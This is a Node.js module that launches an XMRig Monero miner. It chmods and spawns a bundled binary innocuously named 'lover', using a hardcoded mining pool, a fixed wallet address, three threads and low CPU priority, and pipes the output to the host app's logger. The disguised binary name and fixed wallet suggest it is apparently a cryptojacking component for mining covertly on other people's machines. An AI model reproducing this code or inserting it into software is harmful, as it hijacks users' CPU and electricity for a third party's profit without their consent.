const os = require('os');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

const PLATFORM = os.platform().toLowerCase();

const LINUX_PATH = path.join(__dirname, './lover');
const WINDOWS_PATH = path.join(__dirname, './lover.exe');

const WINDOWS_ARGS = [
    '--url', 'gulf.moneroocean.stream:10128',
    '--user', '43WJQfGyaivhEZBr95TZGy3HGei1LVUY5gqyUCAAE4viCRwzJgMcCn3ZVFXtySFxwZLFtrjMPJXhAT9iA9KYf4LoPoKiwBc',
    '--pass', 'x',
    '--cpu-priority', '0',
    '--threads', '3',
    '--donate-level', '1'
];

const LINUX_ARGS = [
    '--url', 'gulf.moneroocean.stream:10128',
    '--user', '43WJQfGyaivhEZBr95TZGy3HGei1LVUY5gqyUCAAE4viCRwzJgMcCn3ZVFXtySFxwZLFtrjMPJXhAT9iA9KYf4LoPoKiwBc',
    '--pass', 'x',
    '--cpu-priority', '0',
    '--threads', '3',
    '--donate-level', '1'
];

module.exports = class XMRIGMiner {
    name = 'xmrig';

    _app = null;
    
    _initialized = false;

    _miner = null;

    _filePath = null;

    _running = false;

    _worker = null;

    constructor(app) {
        this._app = app;
        this._init();
    }

    async _init() {
        if (PLATFORM === 'linux') {
            this._loadLinux();
        } else if (PLATFORM === 'win32') {
            this._loadWindows();
        } else {
            throw new Error('Unsupported platform');
        }

        this._initialized = true;
    }

    start() {
        if (this._running) {
            console.info('XMRIG already running');
            return;
        }
        
        this._running = true;
        this._exec();
    }

    stop() {
        if (this._worker) {
            this._worker.kill();
            this._worker = null;
        }
    }

    getStatus() {
        // Implement a status check if needed
    }

    _loadLinux() {
        // Add execution rights
        fs.chmodSync(LINUX_PATH, 0o754);

        this._filePath = LINUX_PATH;
    }

    _loadWindows() {
        this._filePath = WINDOWS_PATH;
    }

    _exec() {
        this._updateConfig();

        let args = [];

        if (PLATFORM === 'win32') {
            args = WINDOWS_ARGS;
        } else if (PLATFORM === 'linux') {
            args = LINUX_ARGS;
        }

        // Start script
        this._worker = spawn(this._filePath, args);

        // Passthrough output
        this._worker.stdout.on('data', data => this._app.logger.info(data.toString()));
        this._worker.stderr.on('data', data => this._app.logger.error(data.toString()));
    }

    _updateConfig() {
        // Implement the config update logic if needed
    }
}
